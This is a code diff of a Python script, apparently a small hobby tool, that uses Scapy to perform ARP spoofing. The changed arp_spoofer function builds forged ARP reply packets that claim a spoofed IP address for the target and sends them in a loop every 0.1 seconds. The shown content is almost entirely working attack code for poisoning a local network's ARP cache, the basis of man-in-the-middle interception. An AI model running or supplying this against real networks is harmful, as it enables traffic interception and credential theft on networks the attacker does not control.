@@ -29,18 +29,17 @@ def spoof_restorer(src_ip,src_mac,dest_ip,dest_mac):
     # Funtion to restore spoofed table into normal.
     pass
     
-def arp_spoofer(target_ip,target_mac,interface):
-    # Function to create spoofed replay packet creation.
+def arp_spoofer(target_ip,target_mac,spoof_ip,spoof_mac,interface):
+    # Function to create spoofed replay_packet sent.
+    print(str(target_mac)+" : "+str(spoof_mac))
     i=1
     while True:
         try:
-            ether_frame=Ether(dst=target_mac)
-            arp_rpacket=ARP(op=2,psrc=target_ip,pdst=target_ip,hwdst=target_mac)
-            replay_packet=ether_frame / arp_rpacket
-            sendp(replay_packet,iface=interface,verbose=False)
+            arp_rpacket = Ether(dst=target_mac) / ARP(op=2,psrc=spoof_ip, hwdst=target_mac, pdst=target_ip)
+            sendp(arp_rpacket,iface=interface,verbose=False)
             print(f"sent {i} packet")
             i=i+1
-            sleep(2)
+            sleep(0.1)
         except KeyboardInterrupt:
             break
         except Exception as e:
